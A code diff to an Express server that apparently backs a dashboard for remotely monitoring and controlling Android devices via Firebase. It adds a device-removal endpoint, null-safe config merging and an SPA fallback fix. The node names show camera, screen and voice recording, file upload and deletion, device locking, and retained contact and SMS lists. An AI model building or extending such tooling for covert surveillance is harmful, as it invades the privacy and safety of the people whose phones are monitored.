@@ -88,9 +88,18 @@ async function getClientConfig(req) {
   try {
     const r = await fetch(`https://notification-secret-default-rtdb.firebaseio.com/Apis/${pin}.json`);
     const data = await r.json();
-    if (data && data.FIREBASE_DB_URL) {
-      // Merge over local config so any missing fields fall back gracefully
-      const merged = { ...config, ...data };
+    if (data) {
+      // Merge over local config, but IGNORE empty/null/blank values coming
+      // from Firebase so that local fallback credentials (e.g. R2 keys stored
+      // in config.json) still apply when the remote Apis entry doesn't define
+      // them. Without this, an Apis entry saved without R2 fields would wipe
+      // the working local R2 config and the Backups page would say
+      // "R2 not configured".
+      const cleaned = {};
+      for (const [k, v] of Object.entries(data)) {
+        if (v !== null && v !== undefined && String(v).trim() !== '') cleaned[k] = v;
+      }
+      const merged = { ...config, ...cleaned };
       apiCache.set(pin, { data: merged, time: Date.now() });
       return merged;
     }
@@ -253,6 +262,46 @@ app.post('/api/firebase/del', checkAuth, async (req, res) => {
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
+});
+
+// Remove a device entirely from the dashboard.
+//
+// Deletes EVERY Firebase node that belongs to the device EXCEPT the contact
+// list (Contacts/{id}) and the SMS list (message/{id}), which the admin may
+// still want to keep. Because the Devices page auto-discovers devices from the
+// `run` node, removing `run/{id}` makes the device stop showing up.
+//
+// Admin-only: only a registered admin code can wipe device data.
+app.post('/api/firebase/remove-device', checkAdmin, async (req, res) => {
+  const cfg = await getClientConfig(req);
+  const { deviceId } = req.body;
+  if (!deviceId || typeof deviceId !== 'string')
+    return res.status(400).json({ error: 'Missing deviceId' });
+
+  // Every top-level node that the child app writes per-device.
+  // (Mirrors MonitoringService.forceKillAll + the pin/unlock nodes from
+  // Settings.) Contacts and message are intentionally NOT in this list.
+  const nodes = [
+    'Camera_rec', 'Screen_rec', 'Torch', 'shake', 'Call',
+    'Force_kill', 'Open_link', 'lock_device', 'Screen_shooter',
+    'wall', 'Upload_files', 'Delete_file', 'upload',
+    'Voice_rec', 'Notification_send', 'Battary', 'run',
+    'Most_used', 'Device_info', 'Apps', 'pin', 'unlock',
+  ];
+
+  const base = cfg.FIREBASE_DB_URL;
+  if (!base) return res.status(500).json({ error: 'Firebase DB URL not configured' });
+
+  const results = [];
+  for (const node of nodes) {
+    try {
+      const r = await fetch(`${base}/${node}/${deviceId}.json`, { method: 'DELETE' });
+      results.push({ node, ok: r.ok, status: r.status });
+    } catch (e) {
+      results.push({ node, ok: false, error: e.message });
+    }
+  }
+  res.json({ success: true, deviceId, results });
 });
 
 // LiveKit Token Route
@@ -505,19 +554,28 @@ app.post('/api/r2/delete', checkAuth, async (req, res) => {
   }
 });
 
-// Fallback for HTML5 history
+// SPA fallback — only for browser navigation requests.
+//
+// IMPORTANT: this must NOT serve index.html for missing static assets
+// (.css/.js/.png/...). If it did, the browser would receive an HTML document
+// for a <link rel="stylesheet"> or <script src> and render the page WITHOUT
+// any CSS / with broken JS — exactly the "html page only, no CSS" symptom.
+// Missing assets should 404 cleanly; only HTML navigations get index.html.
 app.use((req, res) => {
-  const filePath = path.join(PUBLIC_DIR, 'index.html');
-  res.sendFile(filePath, err => {
-    if (err) {
-      console.error("Error serving index.html:", err.message);
-      if (err.code === 'ENOENT') {
-        res.status(404).send("<h2>404 Not Found</h2><p>The <code>index.html</code> file is missing.</p>");
-      } else {
-        res.status(err.status).end();
+  const accept = req.headers.accept || '';
+  if (req.method === 'GET' && accept.includes('text/html')) {
+    const filePath = path.join(PUBLIC_DIR, 'index.html');
+    return res.sendFile(filePath, err => {
+      if (err) {
+        if (err.code === 'ENOENT') {
+          res.status(404).send("<h2>404 Not Found</h2><p>The <code>index.html</code> file is missing.</p>");
+        } else {
+          try { res.status(err.status || 500).end(); } catch (_) {}
+        }
       }
-    }
-  });
+    });
+  }
+  res.status(404).end();
 });
 
 const PORT = process.env.PORT || 3000;
